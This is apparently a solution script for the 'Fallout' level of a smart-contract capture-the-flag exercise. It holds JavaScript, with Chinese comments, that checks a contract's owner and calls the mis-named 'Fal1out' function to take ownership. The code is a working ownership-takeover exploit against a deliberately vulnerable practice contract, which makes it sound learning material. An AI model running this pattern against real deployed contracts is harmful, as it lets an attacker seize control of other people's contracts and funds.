# 01 - Fallout
```
// 先检查当前 owner
    const owner = await client.readContract({
        address: CONTRACT_ADDRESS,
        abi: abi,
        functionName: 'owner',
    });
    console.log('Current owner:', owner);
    console.log('Your address:', walletClient.account.address);

    // 如果不是 owner,调用 Fal1out
    if (owner.toLowerCase() !== walletClient.account.address.toLowerCase()) {
        console.log('Calling Fal1out...');
        const tx = await walletClient.writeContract({
            address: CONTRACT_ADDRESS,
            abi: abi,
            functionName: 'Fal1out',
        });
        await client.waitForTransactionReceipt({ hash: tx });
        console.log('Fal1out tx hash:', tx);
    } else {
        console.log('Already owner!');
    }
```